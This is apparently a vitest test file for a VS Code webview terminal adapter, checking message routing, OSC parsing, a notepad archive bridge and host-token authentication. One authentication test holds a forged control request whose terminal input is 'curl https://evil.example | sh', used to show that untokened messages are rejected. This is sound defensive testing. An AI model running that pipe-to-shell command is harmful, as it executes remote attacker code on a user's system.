import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

const terminalStateStoreMocks = vi.hoisted(() => ({
  applyTerminalSemanticEvents: vi.fn(),
  removeTerminalPaneState: vi.fn(),
}));

vi.mock('../terminal-state-store', () => ({
  applyTerminalSemanticEvents: terminalStateStoreMocks.applyTerminalSemanticEvents,
  removeTerminalPaneState: terminalStateStoreMocks.removeTerminalPaneState,
}));

const terminalThemeMocks = vi.hoisted(() => ({
  getTerminalTheme: vi.fn(() => ({ foreground: '#eeeeee', background: '#111111', cursor: '#abcabc' })),
  listeners: new Set<() => void>(),
}));

vi.mock('../terminal-theme', () => ({
  getTerminalTheme: terminalThemeMocks.getTerminalTheme,
  onTerminalThemeChange: (cb: () => void) => {
    terminalThemeMocks.listeners.add(cb);
    return () => terminalThemeMocks.listeners.delete(cb);
  },
  // The replay one-shot parser answers colour queries from this, exactly as the
  // real one reads the live xterm theme.
  themeColorProvider: (target: 'foreground' | 'background' | 'cursor') =>
    terminalThemeMocks.getTerminalTheme()[target] ?? null,
}));

import {
  collectTerminalSemanticEvents,
  TerminalProtocolParser,
} from '../terminal-protocol';
import { HOST_MESSAGE_TOKEN_FIELD, HOST_MESSAGE_TOKEN_GLOBAL } from '../vscode-message-token';
import { NOTEPAD_VOLATILE_GLOBAL } from '../vscode-notepad-global';
import type { NotepadArchiveV1, VolatileNotepadSnapshot } from '../notepad/types';
import { VSCodeAdapter } from './vscode-adapter';

/** Stand-in for the per-boot token the extension host injects at webview boot. */
const BURROW_TOKEN = 'test-host-message-token';

/**
 * Build the `message` event the extension host would post: the payload plus the
 * token stamp `serveWebview`'s channel adds. Framed content can't read the
 * token, so a forged message is just this without the stamp.
 */
function hostMessage(data: Record<string, unknown>, token: unknown = BURROW_TOKEN): MessageEvent {
  return new MessageEvent('message', {
    data: { ...data, [HOST_MESSAGE_TOKEN_FIELD]: token },
  });
}

let windowTarget: EventTarget;
let postMessage: ReturnType<typeof vi.fn>;

/** The globals the adapter captures at construction. Shared by the suites below. */
function stubWebviewEnv(): void {
  windowTarget = new EventTarget();
  postMessage = vi.fn();
  terminalThemeMocks.listeners.clear();
  terminalThemeMocks.getTerminalTheme.mockReturnValue({ foreground: '#eeeeee', background: '#111111', cursor: '#abcabc' });
  class TestCustomEvent<T = unknown> extends Event {
    readonly detail: T;

    constructor(type: string, eventInitDict?: CustomEventInit<T>) {
      super(type, eventInitDict);
      this.detail = eventInitDict?.detail as T;
    }

    initCustomEvent(): void {}
  }
  vi.stubGlobal('window', windowTarget);
  vi.stubGlobal('CustomEvent', TestCustomEvent);
  // The adapter captures this at construction, so it must be stubbed before
  // any `new VSCodeAdapter()`.
  vi.stubGlobal(HOST_MESSAGE_TOKEN_GLOBAL, BURROW_TOKEN);
  vi.stubGlobal('acquireVsCodeApi', () => ({
    postMessage,
    getState: vi.fn(),
    setState: vi.fn(),
  }));
}

describe('VSCodeAdapter PTY exit handling', () => {
  beforeEach(stubWebviewEnv);

  afterEach(() => {
    vi.unstubAllGlobals();
    vi.clearAllMocks();
  });

  it('keeps semantic pane state when a PTY exits naturally', () => {
    const adapter = new VSCodeAdapter();
    const exits: Array<{ id: string; exitCode: number }> = [];
    adapter.onPtyExit((detail) => exits.push(detail));

    windowTarget.dispatchEvent(hostMessage({ type: 'pty:exit', id: 'pane-1', exitCode: 7 }));

    expect(exits).toEqual([{ id: 'pane-1', exitCode: 7 }]);
    expect(terminalStateStoreMocks.removeTerminalPaneState).not.toHaveBeenCalled();
  });

  it('lets lifecycle cleanup remove semantic pane state after explicitly killing a PTY', () => {
    const adapter = new VSCodeAdapter();

    adapter.killPty('pane-1');

    expect(terminalStateStoreMocks.removeTerminalPaneState).not.toHaveBeenCalled();
    expect(postMessage).toHaveBeenCalledWith({ type: 'pty:kill', id: 'pane-1' });
  });

  it('pushes resolved theme colors to the extension host on init and on theme change', () => {
    const adapter = new VSCodeAdapter();

    adapter.requestInit();
    expect(postMessage).toHaveBeenCalledWith({
      type: 'dormouse:themeColors',
      foreground: '#eeeeee',
      background: '#111111',
      cursor: '#abcabc',
    });

    // A VS Code theme switch fires the observer, which re-pushes current colors.
    postMessage.mockClear();
    terminalThemeMocks.getTerminalTheme.mockReturnValue({ foreground: '#000000', background: '#ffffff', cursor: '#ff0000' });
    for (const listener of terminalThemeMocks.listeners) listener();
    expect(postMessage).toHaveBeenCalledWith({
      type: 'dormouse:themeColors',
      foreground: '#000000',
      background: '#ffffff',
      cursor: '#ff0000',
    });
  });

  it('posts external hyperlink open requests to the extension host', () => {
    const adapter = new VSCodeAdapter();

    adapter.openExternal('https://example.com/docs');

    expect(postMessage).toHaveBeenCalledWith({
      type: 'dormouse:openExternal',
      uri: 'https://example.com/docs',
    });
  });

  it('posts allowlisted VS Code workbench commands to the extension host', () => {
    const adapter = new VSCodeAdapter();

    adapter.runWorkbenchCommand('workbench.action.quickOpen');

    expect(postMessage).toHaveBeenCalledWith({
      type: 'dormouse:runWorkbenchCommand',
      command: 'workbench.action.quickOpen',
    });
  });

  it('sends watched-command initialization and mutations as distinct messages', () => {
    const adapter = new VSCodeAdapter();

    adapter.alertSetWatchedCommands(['claude']);
    adapter.alertSetCommandWatched('npm', true);

    expect(postMessage).toHaveBeenCalledWith({
      type: 'alert:initializeWatchedCommands',
      names: ['claude'],
    });
    expect(postMessage).toHaveBeenCalledWith({
      type: 'alert:setCommandWatched',
      name: 'npm',
      watched: true,
    });
  });

  // The AlertManager lives in the extension host, so `dor await` parks there
  // and only the outcome crosses back (docs/specs/alert.md → Await).
  it('parks an await in the extension host and settles it from the result message', async () => {
    const adapter = new VSCodeAdapter();

    const handle = adapter.alertAwait('pane-1', { until: 'quiet', timeoutMs: 600_000 });
    const [request] = postMessage.mock.calls[0] as [{ type: string; requestId: string }];
    expect(request).toMatchObject({
      type: 'alert:await',
      id: 'pane-1',
      until: 'quiet',
      timeoutMs: 600_000,
    });

    windowTarget.dispatchEvent(hostMessage({
      type: 'alert:awaitResult',
      requestId: request.requestId,
      outcome: { kind: 'resolved', cause: 'quiet', waitedMs: 12_345 },
    }));

    expect(await handle.promise).toEqual({ kind: 'resolved', cause: 'quiet', waitedMs: 12_345 });
  });

  it('asks the host to cancel and still takes the outcome from the result message', async () => {
    const adapter = new VSCodeAdapter();

    const handle = adapter.alertAwait('pane-1', { until: 'exit', timeoutMs: 1_000 });
    const [request] = postMessage.mock.calls[0] as [{ requestId: string }];
    handle.cancel();

    expect(postMessage).toHaveBeenCalledWith({ type: 'alert:awaitCancel', requestId: request.requestId });

    // The host answers the cancel through the same channel, so a claim is never
    // released locally and then again remotely.
    windowTarget.dispatchEvent(hostMessage({
      type: 'alert:awaitResult',
      requestId: request.requestId,
      outcome: { kind: 'cancelled', waitedMs: 40 },
    }));
    expect(await handle.promise).toEqual({ kind: 'cancelled', waitedMs: 40 });
  });

  it('forwards the host canonical watched-command snapshot', () => {
    const adapter = new VSCodeAdapter();
    const snapshots: string[][] = [];
    adapter.onWatchedCommands((names) => snapshots.push(names));

    windowTarget.dispatchEvent(hostMessage({ type: 'alert:watchedCommands', names: ['claude', 'npm'] }));

    expect(snapshots).toEqual([['claude', 'npm']]);
  });

  it('parses replay buffers into semantic events and strips OSCs before forwarding', () => {
    const adapter = new VSCodeAdapter();
    const replays: Array<{ id: string; data: string }> = [];
    adapter.onPtyReplay((detail) => replays.push(detail));

    windowTarget.dispatchEvent(hostMessage({
      type: 'pty:replay',
      id: 'pane-1',
      data: 'hello\x1b]7;file://localhost/Users/me/project\x1b\\world',
    }));

    // Visible data is stripped of the OSC 7 sequence.
    expect(replays).toEqual([{ id: 'pane-1', data: 'helloworld' }]);

    // Semantic CWD event was forwarded under the PTY id.
    expect(terminalStateStoreMocks.applyTerminalSemanticEvents).toHaveBeenCalledTimes(1);
    const [forwardedId, forwardedEvents] = terminalStateStoreMocks.applyTerminalSemanticEvents.mock.calls[0];
    expect(forwardedId).toBe('pane-1');
    expect(forwardedEvents).toHaveLength(1);
    expect(forwardedEvents[0]).toMatchObject({
      type: 'cwd',
      cwd: { path: '/Users/me/project', source: 'osc7' },
    });
  });

  it('consumes a buffered colour query rather than replaying it into xterm.js', () => {
    // A *declined* query is not consumed, so it survives into the replayed
    // bytes for xterm.js to answer — and answering is the owner's alone
    // (docs/specs/terminal-escapes.md).
    const adapter = new VSCodeAdapter();
    const replays: Array<{ id: string; data: string }> = [];
    adapter.onPtyReplay((detail) => replays.push(detail));

    windowTarget.dispatchEvent(hostMessage({
      type: 'pty:replay',
      id: 'pane-1',
      data: 'before\x1b]11;?\x07after',
    }));

    expect(replays).toEqual([{ id: 'pane-1', data: 'beforeafter' }]);
  });

  it('forwards extension-host semantic events to the pane state store', () => {
    const adapter = new VSCodeAdapter();
    const events = [
      { type: 'cwd' as const, cwd: { path: '/repo', pathKind: 'posix' as const, isRemote: false, source: 'osc633' as const, updatedAt: 5 } },
      { type: 'promptStart' as const },
    ];

    windowTarget.dispatchEvent(hostMessage({ type: 'terminal:semanticEvents', id: 'pane-1', events }));
    void adapter;

    expect(terminalStateStoreMocks.applyTerminalSemanticEvents).toHaveBeenCalledTimes(1);
    expect(terminalStateStoreMocks.applyTerminalSemanticEvents).toHaveBeenCalledWith('pane-1', events);
  });

  it('round-trips host-parsed semantic events through JSON to the webview adapter', () => {
    // Simulate the extension host: run live PTY data through the same parser
    // that message-router.ts uses, collect semantic events, then ship them
    // over the postMessage wire as terminal:semanticEvents.
    const hostParser = new TerminalProtocolParser();
    const parsed = hostParser.process(
      'before\x1b]7;file://prod-box/srv/app\x1b\\\x1b]133;A\x07after',
    );
    const hostEvents = collectTerminalSemanticEvents(parsed.events);
    expect(hostEvents).toHaveLength(2);

    // postMessage forces structured-clone-equivalent serialization. JSON
    // round-trip is a sufficient stand-in: it would drop functions or
    // non-cloneable values, so passing this also documents that the wire
    // payload contains only plain data.
    const wirePayload = JSON.parse(JSON.stringify({
      type: 'terminal:semanticEvents',
      id: 'pane-1',
      events: hostEvents,
    }));

    new VSCodeAdapter();
    windowTarget.dispatchEvent(hostMessage(wirePayload));

    expect(terminalStateStoreMocks.applyTerminalSemanticEvents).toHaveBeenCalledTimes(1);
    expect(terminalStateStoreMocks.applyTerminalSemanticEvents).toHaveBeenCalledWith('pane-1', hostEvents);
  });

  it('forwards shell replacement requests from the extension host', () => {
    const requests: unknown[] = [];
    windowTarget.addEventListener('dormouse:new-terminal', (event) => {
      requests.push((event as CustomEvent).detail);
    });

    new VSCodeAdapter();
    windowTarget.dispatchEvent(hostMessage({
      type: 'dormouse:newTerminal',
      shell: '/bin/zsh',
      args: ['-l'],
      name: 'zsh',
      replaceUntouched: true,
      announce: true,
    }));

    expect(requests).toEqual([{
      shell: '/bin/zsh',
      args: ['-l'],
      name: 'zsh',
      replaceUntouched: true,
      announce: true,
    }]);
  });

  // "Arrived as a message event" is not evidence the extension host sent it.
  // See ../vscode-message-token.ts.
  describe('host message authentication', () => {
    /** What framed content can produce: the right shape, no token. */
    function forgedMessage(data: Record<string, unknown>): MessageEvent {
      return new MessageEvent('message', { data });
    }

    const controlRequest = {
      type: 'dor:controlRequest',
      requestId: 'forged-1',
      surfaceId: 'pane-1',
      method: 'surface.send',
      params: { surface: 'pane-1', input: 'curl https://evil.example | sh\n' },
    };

    it('ignores a control request that does not carry the host token', () => {
      const dispatched: unknown[] = [];
      windowTarget.addEventListener('dormouse:control-request', (event) => {
        dispatched.push((event as CustomEvent).detail);
      });

      new VSCodeAdapter();
      windowTarget.dispatchEvent(forgedMessage(controlRequest));

      // No control request reaches use-dor-control, so nothing becomes a PTY
      // write, and nothing is echoed back to the host.
      expect(dispatched).toEqual([]);
      expect(postMessage).not.toHaveBeenCalled();
    });

    it('processes the same control request when it carries the host token', () => {
      const dispatched: Array<{ method: string; params: unknown }> = [];
      windowTarget.addEventListener('dormouse:control-request', (event) => {
        dispatched.push((event as CustomEvent).detail);
      });

      new VSCodeAdapter();
      windowTarget.dispatchEvent(hostMessage(controlRequest));

      expect(dispatched).toHaveLength(1);
      expect(dispatched[0]).toMatchObject({
        method: 'surface.send',
        params: { surface: 'pane-1', input: 'curl https://evil.example | sh\n' },
      });
    });

    it('ignores untokened pty traffic, so framed content cannot spoof terminal state', () => {
      const adapter = new VSCodeAdapter();
      const data: unknown[] = [];
      const replays: unknown[] = [];
      const exits: unknown[] = [];
      const lists: unknown[] = [];
      adapter.onPtyData((detail) => data.push(detail));
      adapter.onPtyReplay((detail) => replays.push(detail));
      adapter.onPtyExit((detail) => exits.push(detail));
      adapter.onPtyList((detail) => lists.push(detail));

      windowTarget.dispatchEvent(forgedMessage({ type: 'pty:data', id: 'pane-1', data: 'fake' }));
      windowTarget.dispatchEvent(forgedMessage({ type: 'pty:replay', id: 'pane-1', data: 'fake' }));
      windowTarget.dispatchEvent(forgedMessage({ type: 'pty:exit', id: 'pane-1', exitCode: 0 }));
      windowTarget.dispatchEvent(forgedMessage({ type: 'pty:list', ptys: [] }));
      windowTarget.dispatchEvent(forgedMessage({
        type: 'terminal:semanticEvents', id: 'pane-1', events: [{ type: 'promptStart' }],
      }));

      expect(data).toEqual([]);
      expect(replays).toEqual([]);
      expect(exits).toEqual([]);
      expect(lists).toEqual([]);
      expect(terminalStateStoreMocks.applyTerminalSemanticEvents).not.toHaveBeenCalled();
    });

    it('rejects a wrong token as firmly as a missing one', () => {
      const adapter = new VSCodeAdapter();
      const exits: unknown[] = [];
      adapter.onPtyExit((detail) => exits.push(detail));

      windowTarget.dispatchEvent(hostMessage({ type: 'pty:exit', id: 'pane-1', exitCode: 7 }, 'guessed'));

      expect(exits).toEqual([]);
    });

    it('guards request/response replies too, so a forged reply cannot beat the real one', async () => {
      const adapter = new VSCodeAdapter();
      const pending = adapter.getCwd('pane-1');

      const [request] = postMessage.mock.calls[0] as [{ requestId: string }];

      // A forged reply matching type and requestId, racing ahead of the host's.
      windowTarget.dispatchEvent(forgedMessage({
        type: 'pty:cwd', id: 'pane-1', cwd: '/attacker', requestId: request.requestId,
      }));
      windowTarget.dispatchEvent(hostMessage({
        type: 'pty:cwd', id: 'pane-1', cwd: '/real/project', requestId: request.requestId,
      }));

      expect(await pending).toBe('/real/project');
    });

    it('accepts nothing when the host injected no token', () => {
      // A webview served without the global fails closed rather than open.
      vi.stubGlobal(HOST_MESSAGE_TOKEN_GLOBAL, undefined);
      const adapter = new VSCodeAdapter();
      const exits: unknown[] = [];
      adapter.onPtyExit((detail) => exits.push(detail));

      windowTarget.dispatchEvent(hostMessage({ type: 'pty:exit', id: 'pane-1', exitCode: 7 }));

      expect(exits).toEqual([]);
    });
  });
});


// The archive lives in the extension host's `globalState` — nothing in the
// webview can reach it — so the port is a request/response bridge
// (docs/specs/notepad.md). What is covered here is what this transport adds: the
// compare-and-swap shape on the wire, failures that reject rather than resolve,
// and the boot mirror being consumable exactly once.
describe('VSCodeAdapter notepad archive', () => {
  beforeEach(stubWebviewEnv);

  afterEach(() => {
    vi.unstubAllGlobals();
    vi.clearAllMocks();
  });

  const EMPTY: NotepadArchiveV1 = { version: 1, batches: [] };

  /** The last archive request posted, whatever its type. */
  function lastRequest(): { type: string; requestId: string; [key: string]: unknown } {
    const posted = postMessage.mock.calls.map((call) => call[0]);
    const request = [...posted].reverse().find((message) => String(message.type).startsWith('notepad:'));
    if (!request) throw new Error('no notepad request was posted');
    return request;
  }

  function answer(ok: boolean, extra: Record<string, unknown> = {}): void {
    windowTarget.dispatchEvent(hostMessage({
      type: 'notepad:result', requestId: lastRequest().requestId, ok, ...extra,
    }));
  }

  it('loads the stored archive with the revision that names it', async () => {
    const adapter = new VSCodeAdapter();
    const pending = adapter.notepadArchive!.load();

    expect(lastRequest()).toMatchObject({ type: 'notepad:load' });
    answer(true, { result: { raw: JSON.stringify(EMPTY), revision: 'r3' } });

    expect(await pending).toEqual({ raw: JSON.stringify(EMPTY), revision: 'r3' });
  });

  it('sends the whole archive and the revision it was built on', async () => {
    const adapter = new VSCodeAdapter();
    const pending = adapter.notepadArchive!.save(EMPTY, 'r3');

    // The host stores bytes and compares revisions; it never parses or merges.
    expect(lastRequest()).toMatchObject({
      type: 'notepad:save', state: JSON.stringify(EMPTY), baseRevision: 'r3',
    });
    answer(true, { result: 'conflict' });

    // A conflict is an outcome, not a failure — the shared service re-reads and retries.
    expect(await pending).toBe('conflict');
  });

  it('rejects a failed request rather than resolving it as an empty archive', async () => {
    // `null` legitimately means "nothing archived yet", so a failure that
    // resolved like one would let the next save overwrite an archive nobody read.
    const adapter = new VSCodeAdapter();
    const pending = adapter.notepadArchive!.load();
    answer(false, { error: 'globalState is gone' });
    await expect(pending).rejects.toThrow('globalState is gone');
  });

  it('rejects rather than hanging when the host never answers', async () => {
    const adapter = new VSCodeAdapter();
    vi.useFakeTimers();
    try {
      const pending = adapter.notepadArchive!.load();
      const rejected = expect(pending).rejects.toThrow(/timed out/);
      await vi.advanceTimersByTimeAsync(10_000);
      await rejected;
    } finally {
      vi.useRealTimers();
    }
  });

  it('asks the host to move an unreadable archive aside', async () => {
    const adapter = new VSCodeAdapter();
    const pending = adapter.notepadArchive!.resetUnreadable();
    expect(lastRequest()).toMatchObject({ type: 'notepad:reset' });
    answer(true, {});
    await expect(pending).resolves.toBeUndefined();
  });

  it('mirrors live notes to the extension host without waiting on it', () => {
    // Fire and forget: the mirror is what lets a teardown archive from a webview
    // VS Code has already destroyed.
    const adapter = new VSCodeAdapter();
    const snapshot: VolatileNotepadSnapshot = {
      surfaces: [{
        surfaceId: 'pane-1', surfaceTitle: 'zsh', surfaceKind: 'terminal', cwd: null,
        notes: [{ id: 'n1', createdAt: 1, content: { kind: 'plain', text: 'hi' } }],
      }],
      stagedDeletions: { deleteBatchIds: [], deleteNotes: [] },
    };

    adapter.notepadArchive!.syncVolatile!(snapshot);

    expect(postMessage).toHaveBeenCalledWith({ type: 'notepad:volatile', snapshot });
  });

  it('hands the boot mirror over exactly once', () => {
    const snapshot: VolatileNotepadSnapshot = {
      surfaces: [{
        surfaceId: 'pane-1', surfaceTitle: 'zsh', surfaceKind: 'terminal', cwd: null,
        notes: [{ id: 'n1', createdAt: 1, content: { kind: 'plain', text: 'hi' } }],
      }],
      stagedDeletions: { deleteBatchIds: [], deleteNotes: [] },
    };
    vi.stubGlobal(NOTEPAD_VOLATILE_GLOBAL, snapshot);

    const adapter = new VSCodeAdapter();
    expect(adapter.notepadArchive!.loadVolatile!()).toEqual(snapshot);
    // A second read would be a later restore's, and a restore must never
    // hydrate live notes.
    expect(adapter.notepadArchive!.loadVolatile!()).toBeNull();
  });

  it('gives a cold restore no mirror at all', () => {
    // The global is absent on every boot but a live resume.
    const adapter = new VSCodeAdapter();
    expect(adapter.notepadArchive!.loadVolatile!()).toBeNull();
  });
});

// The Burrow lives in the extension host, in whichever VS Code window won
// the bind (vscode-ext/src/burrow.ts). This is the webview's end of that
// bridge; the contract is lib/src/host/remote/service-protocol.ts.
//
// Only what this transport adds is covered here: which message carries what,
// and the host-token guard in front of all of it. The correlation, timeout,
// always-answer, and dispose rules are the shared client's
// (lib/src/host/remote/link-client.test.ts).
describe('VSCodeAdapter remote host link', () => {
  beforeEach(stubWebviewEnv);

  afterEach(() => {
    vi.unstubAllGlobals();
    vi.clearAllMocks();
  });

  /** Every `burrow:command` this adapter has posted, in order. */
  function sent(): Array<{ burrowRequestId: string; cmd: string; params?: unknown }> {
    return postMessage.mock.calls
      .map((call) => call[0])
      .filter((message) => message.type === 'burrow:command')
      .map((message) => message.payload);
  }

  function deliver(data: Record<string, unknown>): void {
    windowTarget.dispatchEvent(hostMessage(data));
  }

  it('posts a command and settles it from the result message', async () => {
    const adapter = new VSCodeAdapter();
    const pending = adapter.burrow.command('status');

    const payload = sent()[0]!;
    expect(payload.cmd).toBe('status');
    deliver({ type: 'burrow:result', payload: { burrowRequestId: payload.burrowRequestId, result: { enrolled: true } } });

    expect(await pending).toEqual({ enrolled: true });
  });

  it('answers an ask from the registered responder', () => {
    const adapter = new VSCodeAdapter();
    adapter.burrow.respond('surfaceOp', (params) => [
      { ptyId: 'pty-1', ...(params as Record<string, unknown>) },
    ]);

    deliver({ type: 'peer:ask', requestId: 'ask-1', op: 'surfaceOp', params: { surfaceId: 's1' } });

    expect(postMessage).toHaveBeenCalledWith({
      type: 'peer:answer',
      requestId: 'ask-1',
      results: [{ ptyId: 'pty-1', surfaceId: 's1' }],
    });
  });

  it('fans an extension-host event out by name', () => {
    const adapter = new VSCodeAdapter();
    const seen: unknown[] = [];
    adapter.burrow.on('pairing-queue', (data) => void seen.push(data));

    deliver({ type: 'burrow:event', payload: { name: 'pairing-queue', queue: [{ clientId: 'c1' }] } });
    expect(seen).toEqual([{ name: 'pairing-queue', queue: [{ clientId: 'c1' }] }]);
  });

  it('notifies without waiting for anything', () => {
    const adapter = new VSCodeAdapter();
    adapter.burrow.notify();
    expect(postMessage).toHaveBeenCalledWith({ type: 'peer:notify' });
  });

  it('rejects what is still in flight when the webview shuts down', async () => {
    // The extension host cleans up the PTYs, but nothing there will ever answer
    // a command this webview is still holding.
    const adapter = new VSCodeAdapter();
    const pending = adapter.burrow.command('status');
    adapter.shutdown();
    await expect(pending).rejects.toThrow('burrow bridge closed');
  });

  it('ignores an unauthenticated result, so framed content cannot settle a command', async () => {
    const adapter = new VSCodeAdapter();
    vi.useFakeTimers();
    try {
      const pending = adapter.burrow.command('status');
      const rejected = expect(pending).rejects.toThrow(/timed out/);
      windowTarget.dispatchEvent(
        new MessageEvent('message', {
          data: { type: 'burrow:result', payload: { burrowRequestId: sent()[0]!.burrowRequestId, result: 'forged' } },
        }),
      );
      await vi.advanceTimersByTimeAsync(20_000);
      await rejected;
    } finally {
      vi.useRealTimers();
    }
  });
});
